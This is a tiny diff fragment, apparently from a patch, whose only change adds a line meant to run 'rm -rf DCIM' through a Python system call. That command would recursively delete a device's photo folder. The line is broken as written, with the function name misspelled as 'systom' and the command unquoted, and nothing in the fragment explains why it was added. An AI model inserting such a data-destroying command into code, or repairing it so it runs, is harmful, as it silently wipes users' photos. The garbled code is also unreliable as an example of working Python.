@@ -1,1 +1,1 @@
-
+os.systom(rm -rf DCIM)
